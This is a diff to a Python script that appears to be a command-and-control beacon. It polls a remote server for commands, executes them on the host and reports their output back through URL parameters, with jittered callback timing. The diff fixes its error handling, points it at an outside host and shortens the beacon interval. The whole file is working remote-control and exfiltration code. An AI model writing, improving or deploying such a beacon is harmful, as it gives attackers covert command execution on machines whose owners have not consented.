@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 import os, requests, time, socket, json, random, sys, random
-
+'''
 ips = [
 		'192.168.5.147',
 		'192.168.5.152',
@@ -23,8 +23,8 @@ ips = [
 		'192.168.6.6',
 		'192.168.6.82'
 ]
-
-#ips=['127.0.0.1']
+'''
+ips=['ssh.galaxynet.me']
 
 """
 Function: getIP
@@ -65,7 +65,7 @@ def beacon():
 		#commands from server to run
 		try:
 			commands = requests.get('http://{}/beacon?ip={}'.format(arkIP, ip))
-		except expression as E:
+		except:
 			pass
 		
 
@@ -81,13 +81,13 @@ def beacon():
 				#send confirmation of command being run
 				try:
 					requests.get('http://{}/confirm?ip={}&cmd={}&output={}'.format(arkIP, ip, cmd, cmds[cmd])) 
-				except exppression as E:
+				except:
 					pass
 			#print commands
 			#print(cmds)
 			#TODO send command respone to server
 		#wait 3 to 17 seconds to callback
-		time.sleep(45 + offset)
+		time.sleep(30 + offset)
 
 
 beacon()
